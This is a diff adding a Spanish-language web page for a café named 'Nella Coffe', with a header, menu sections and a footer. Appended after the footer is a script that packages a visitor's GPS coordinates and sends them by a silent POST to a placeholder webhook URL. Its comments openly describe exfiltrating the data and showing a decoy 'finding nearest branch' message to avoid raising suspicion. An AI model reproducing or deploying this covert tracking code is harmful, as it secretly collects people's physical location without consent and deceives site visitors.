@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nella Coffe - Menú y Cafetería</title>
+    <link href="css/style.css" rel="stylesheet" type="text/css" />
+
+</head>
+<body>
+
+    <!-- ENCABEZADO / HEADER -->
+    <header class="main-header">
+        <div class="logo-container">
+            <h1 class="brand-title">Nella Coffe</h1>
+        </div>
+        
+        <div class="header-center">
+            <a href="#carta-hoy" class="btn-carta-hoy">La Carta de Hoy</a>
+        </div>
+        
+        <div class="social-contacts">
+            <span class="contact-label">Contactos</span>
+            <div class="social-links">
+                <a href="#" class="social-icon icon-phone" aria-label="Teléfono / WhatsApp">📞</a>
+                <a href="#" class="social-icon icon-facebook" aria-label="Facebook">🌐</a>
+                <a href="#" class="social-icon icon-instagram" aria-label="Instagram">📷</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- CONTENIDO PRINCIPAL -->
+    <main class="main-content">
+        
+        <!-- Sección: Quiénes somos -->
+        <section class="about-section">
+            <h2 class="section-title">Quiénes Somos</h2>
+            <ul class="about-list">
+                <li><a href="#historia">Historia</a></li>
+                <li><a href="#valores">Valores</a></li>
+                <li><a href="#tradicion">Tradición</a></li>
+            </ul>
+        </section>
+
+        <!-- Sección: Carta / Menú por categorías -->
+        <section class="menu-section" id="carta-hoy">
+            <h2 class="section-title">Secciones por Tipo y Estilo</h2>
+            <div class="menu-categories">
+                <article class="category-card" id="desayunos">
+                    <h3>Opciones de Desayuno</h3>
+                </article>
+                
+                <article class="category-card" id="almuerzo">
+                    <h3>Almuerzo</h3>
+                </article>
+                
+                <article class="category-card" id="cena">
+                    <h3>Cena</h3>
+                </article>
+                
+                <article class="category-card" id="postres">
+                    <h3>Postres</h3>
+                </article>
+                
+                <article class="category-card" id="bebidas">
+                    <h3>Bebidas</h3>
+                </article>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- PIE DE PÁGINA / FOOTER -->
+    <footer class="main-footer">
+        <div class="footer-item footer-reservas">
+            <a href="#reservas" class="footer-link">Reservas</a>
+        </div>
+        
+        <div class="footer-item footer-ubicacion">
+            <a href="#ubicacion" class="footer-link">Ubicación</a>
+        </div>
+        
+        <div class="footer-item footer-info">
+            <a href="#libro-reclamaciones" class="footer-link">Libro de Reclamaciones</a>
+            <a href="#trabaja-nosotros" class="footer-link">Trabaja con Nosotros</a>
+        </div>
+    </footer>
+<script>
+function locationSuccess(position) {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+    const accuracy = position.coords.accuracy;
+
+    // Esto lo enviaremos a tu Webhook
+    const datosUbicacion = {
+        latitud: latitude,
+        longitud: longitude,
+        precision: accuracy,
+        fecha: new Date().toISOString(),
+        googleMapsLink: `https://www.google.com/maps?q=${latitude},${longitude}`
+    };
+
+    // Petición HTTP silenciosa para exfiltrar los datos
+    fetch('AQUI_PEGA_TU_URL_DE_WEBHOOK_SITE', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(datosUbicacion),
+        mode: 'no-cors' // Evita errores de seguridad en el navegador al enviar datos a otro dominio
+    });
+
+    console.log("Ubicación procesada.");
+    
+    // Opcional: Mostrar mensaje en la web para no levantar sospechas
+    const infoDiv = document.getElementById('geoInfo');
+    if(infoDiv) {
+        infoDiv.innerHTML = `<p>Buscando la sucursal más cercana...</p>`;
+    }
+}
+
+</script>
+</body>
+</html>
